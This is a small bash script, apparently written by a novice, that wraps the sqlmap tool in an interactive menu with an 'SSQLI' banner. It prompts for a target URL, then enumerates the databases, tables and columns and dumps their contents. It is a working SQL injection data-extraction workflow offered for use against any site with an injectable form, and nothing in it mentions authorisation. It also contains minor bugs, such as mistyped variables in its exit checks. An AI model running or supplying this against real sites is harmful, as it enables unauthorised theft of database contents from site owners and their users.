#! /bin/bash

# form needed

# im just noob


echo "          ███████╗███████╗ ██████╗ ██╗     ██╗          "
echo "          ██╔════╝██╔════╝██╔═══██╗██║     ██║          "
echo "          ███████╗███████╗██║   ██║██║     ██║          "
echo "          ╚════██║╚════██║██║▄▄ ██║██║     ██║          "
echo "          ███████║███████║╚██████╔╝███████╗██║          "
echo "          ╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝          "
echo ""

echo " [if you get a target form bingoo in needed, now scan with ssqli in sqlmap] "
echo " [this is very simple , you just insert name target, databse, and more in the bottom]"
echo " [ok lets start]"
echo ""

sleep 2

# target

echo -n "TARGET > "
read target

./sqlmap.py -u $target --dbs

echo " [if you look database klick y, q for exit]"
read answer

if [[ "$answer" = "y" ]]
then
	echo " [insert database name] "
	read dbs
elif [[ "$answer" = "q" ]]
then
	exit
	exit
else
	exit
fi

# tables

echo -n "DATABASE NAME > is $dbs, klick enter for search tables"
read enter

./sqlmap.py -u $target -D $dbs --tables

echo " [if you look tables klick y,q for exit] "
read answer2

if [[ "$answer2" = "y" ]]
then
	echo " [insert tables name] "
	read tab
elif [[ "$answr2" = "q" ]]
then
	exit
else
	exit
fi

# columns

echo -n "TABLES NAME > is $tab, klick enter for search columns"
read enter

./sqlmap.py -u $target -D $dbs -T $tab --columns

echo " [if you look columns klick y,q for exit] "
read answer3

if [[ "$answer3" = "y" ]]
then
	echo " [insert columns name] "
	read col
elif [[ "$answer" = "q" ]]
then
	exit
else
	exit
fi

# the last is dump

echo " [THE LAST STEP] "
echo " $target is target "
echo " $dbs is database "
echo " $tab is tables "
echo " $col is columns "
echo " [THE LAST STEP , COLUMNS NAME IS $col, klick enter for dump] "
echo " [if you failed in the last step, maybe your connection is trouble] "
echo " KLICK ENTER > "
read enter

./sqlmap.py -u $target -D $dbs -T $tab -C $col --dump

echo " [THANKS] "

# end


                                  
